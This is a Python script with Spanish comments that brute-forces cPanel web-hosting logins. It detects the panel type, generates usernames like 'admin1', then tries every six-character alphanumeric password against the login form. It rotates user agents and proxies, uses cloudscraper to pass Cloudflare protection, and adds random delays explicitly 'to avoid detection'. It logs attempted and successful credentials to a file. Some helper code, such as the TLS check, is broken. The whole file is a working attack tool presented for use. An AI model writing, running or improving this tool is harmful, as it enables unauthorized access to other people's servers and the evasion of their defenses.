

import cloudscraper
import itertools
import string
from time import sleep
import random
from urllib.parse import urlencode
from urllib3.util.ssl_ import create_urllib3_context

# Generador de encabezados aleatorios para evasión
def headers_aleatorios():
    agentes = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    return {
        "User-Agent": random.choice(agentes),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }

# Cargar lista de proxies
def cargar_proxies():
    return [
        "http://proxy1:port",
        "http://proxy2:port",
        "http://proxy3:port"  # Añadir proxies confiables
    ]

def seleccionar_proxy(proxies):
    return random.choice(proxies)

# Analizar tecnología TLS
def analizar_tls(url):
    try:
        domain = url.split("://")[1].split("/")[0]
        context = create_urllib3_context()
        with context.wrap_socket(cloudscraper.create_scraper().get_adapter('https://').init_poolmanager().connection_pool_kw['ssl_context'].wrap_socket()) as sock:
            sock.connect((domain, 443))
            tls_version = sock.version()
        print(f"[INFO] Tecnología TLS detectada: {tls_version}")
    except Exception as e:
        print(f"[ERROR] No se pudo analizar TLS: {e}")

# Detectar tipo de panel
def verificar_panel(url, scraper):
    try:
        response = scraper.get(url, timeout=10)
        headers = response.headers
        if "cpanel" in headers.get("server", "").lower():
            return "cPanel"
        elif "plesk" in headers.get("server", "").lower():
            return "Plesk"
        elif "directadmin" in headers.get("server", "").lower():
            return "DirectAdmin"
        elif "webmin" in headers.get("server", "").lower():
            return "Webmin/Virtualmin"
        else:
            return "Desconocido o personalizado"
    except Exception as e:
        print(f"[ERROR] No se pudo verificar el panel: {e}")
        return "Error"

# Generador de nombres de usuario
def generador_usuarios():
    nombres = ["admin", "user", "web", "cpanel"]
    numeros = range(1, 10)
    for nombre in nombres:
        yield nombre
    for nombre in nombres:
        for numero in numeros:
            yield f"{nombre}{numero}"

# Generador de contraseñas dinámicas
def generador_contraseñas(longitud=6):
    caracteres = string.ascii_letters + string.digits
    for password in itertools.product(caracteres, repeat=longitud):
        yield ''.join(password)

# Intentar login con evasión
def intentar_login(scraper, url, usuario, password, proxies, verbose=False):
    payload = {
        'user': usuario,
        'pass': password
    }
    headers = headers_aleatorios()
    proxy = {"http": seleccionar_proxy(proxies), "https": seleccionar_proxy(proxies)}

    try:
        response = scraper.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        if verbose:
            print(f"[DEBUG] Código de estado: {response.status_code}, URL final: {response.url}, Proxy: {proxy}")
        if response.status_code == 200 and ("dashboard" in response.text or "Log out" in response.text):
            return True
        return False
    except Exception as e:
        print(f"[ERROR] Fallo al conectar: {e}")
        return False

# Guardar progreso de los intentos
def guardar_progreso(usuario, password, archivo="progreso.txt"):
    with open(archivo, "a") as f:
        f.write(f"Usuario: {usuario}, Contraseña: {password}\n")

# Inicializar Cloudscraper
scraper = cloudscraper.create_scraper()

# Solicitar URL y cargar proxies
cpanel_url = input("Introduce la URL del cPanel o del sitio: ")
proxies = cargar_proxies()

# Detectar tipo de panel
tipo_panel = verificar_panel(cpanel_url, scraper)
print(f"[INFO] Tipo de panel detectado: {tipo_panel}")

if tipo_panel != "cPanel":
    print(f"[INFO] El panel detectado no es cPanel. Es de tipo: {tipo_panel}. Saliendo...")
    exit()

# Analizar TLS
analizar_tls(cpanel_url)

# Configuración de verbose
verbose = input("¿Activar modo verbose? (s/n): ").strip().lower() == 's'

# Probar nombres de usuario y contraseñas generadas dinámicamente
print("[INFO] Iniciando fuerza bruta con evasión avanzada y persistencia...")
usuarios_probados = 0
for usuario in generador_usuarios():
    print(f"[USUARIO] Probando con: {usuario}")
    for password in generador_contraseñas(longitud=6):  # Cambiar la longitud según necesidad
        usuarios_probados += 1
        print(f"[INTENTO {usuarios_probados}] Usuario: {usuario}, Contraseña: {password}")
        if intentar_login(scraper, cpanel_url, usuario, password, proxies, verbose=verbose):
            print(f"[ÉXITO] Login exitoso con Usuario: {usuario}, Contraseña: {password}")
            guardar_progreso(usuario, password)
            exit()
        else:
            print("[FALLO] Contraseña incorrecta.")
            guardar_progreso(usuario, password)
        sleep(random.uniform(1, 3))  # Pausa aleatoria para evitar detección
else:
    print("[FINALIZADO] No se encontró ninguna combinación válida.")
